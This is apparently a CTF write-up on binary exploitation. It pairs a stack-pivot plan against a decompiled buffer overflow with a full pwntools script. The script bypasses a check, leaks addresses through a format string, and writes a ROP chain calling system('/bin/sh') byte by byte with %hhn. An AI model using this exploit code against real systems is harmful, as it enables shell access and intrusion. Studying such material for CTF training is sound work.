```c
int vul()
{
  char s[40]; // [esp+0h] [ebp-2Ch] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

## Exploitation

1. Leak the contents of rbp (leaking a stack address) to obtain the address of the current buffer on the stack
2. Input again: build gadgets and overflow rbp, modifying rbp to the address used for the main function's leave; ret stack pivot after the function exits — that is, the address on the buffer — so that the ROP chain on the buffer can be executed (executing system("/bin/sh"))

## Approach
![Image](/images/csdn/2024/csdn-138804721/image-013-f047cf2e43.png)
To reach the format string, s1=yes is required. Exploit the fact that assigning an int to a char truncates it, bypassing the check so it returns 0 when equal to 0x73. Then use the format string to leak addresses, and loop to trigger the format string vulnerability again

![Image](/images/csdn/2024/csdn-138804721/image-014-14da8906bf.png)
Modify the last byte of printf's GOT entry to 0x70


![Image](/images/csdn/2024/csdn-138804721/image-015-c170e250ab.png)

At the same time, convert the format string into a byte stream: `f"%{v}c%8$hhn".encode().ljust(0x10,b"a")`
What about writing a zero byte? Just use `%8$hhn` directly

> `%0c` is a format specifier in the printf family of functions, used to output a single character. In `%0c`, the `0` as a padding character actually has no effect here, because %c itself only handles one character; no matter what the preceding number is, it only outputs one character, or outputs nothing when the character does not exist (i.e., nothing is printed). Therefore, `%0c` has the same effect as `%c`: both output a single character based on the provided argument.

from pwn import *
 
context(arch='amd64', os='linux',log_level='debug')
p=process("./pwn")
libc = ELF('./libc.so.6')
elf = ELF('./pwn')

# gdb.attach(p)

def vuln_printf(payload):
    p.sendlineafter(b"Would you choose me if you had to do it all over again?",str(0x79))
    p.sendline(str(0x65))
    p.sendline(str(0x173))
    p.sendlineafter(b"How many years will you be with me this time???\n",payload)                  


def bre():
    p.sendlineafter("4. 彭仙女\n",str(4))
    p.sendline(str(0x73))

p.sendlineafter(b"Please input your idx:\n",str(-0xf8))
p.sendlineafter(b"Please input your name:\n",b"a"*0x6f)

p.sendlineafter("4. 彭仙女\n",str(4))
vuln_printf(b"%9$p %13$p %23$p ")  
stack=int(p.recvuntil(" ",drop=True),16)+0x28
elf.address=int(p.recvuntil(" ",drop=True),16)-0x18b2
libc.address=int(p.recvuntil(" ",drop=True),16)-0x29d90

pop_rdi_ret=0x000000000002a3e5+libc.address
ret=0x000000000002a3e6+libc.address
print(hex(stack),hex(elf.address),hex(libc.address))

binsh=next(libc.search(b'/bin/sh\0'))
payload=p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(libc.sym["system"])
for i,v in enumerate(payload):
    if v==0:
        p.sendlineafter("4. 彭仙女\n",str(4))
        fmt= b"%8$hhn".ljust(0x10,b"a")+p64(stack+i)
        vuln_printf(fmt)
    else :
        p.sendlineafter("4. 彭仙女\n",str(4))
        fmt= f"%{v}c%8$hhn".encode().ljust(0x10,b"a")+p64(stack+i)
        vuln_printf(fmt)
bre()
p.interactive()
